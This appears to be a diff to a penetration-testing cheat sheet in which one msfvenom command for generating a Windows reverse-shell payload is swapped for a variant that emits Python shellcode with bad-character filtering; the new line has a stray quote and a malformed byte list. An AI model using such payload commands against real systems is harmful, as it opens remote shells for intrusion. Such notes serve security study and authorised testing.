@@ -62,7 +62,7 @@ msf-nasm_shell
 ```
   10. generate Windows reverse shell
 ```
-msfvenom -p windows/shell_reverse_tcp LHOST=$IP LPORT=$PORT -f c -e x86/shell -b "\x00"
+msfvenom -p windows/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -b "\x00\xyz\xxx" EXITFUNC=thread -f python -v payload"
 ```
 
 ## Tools
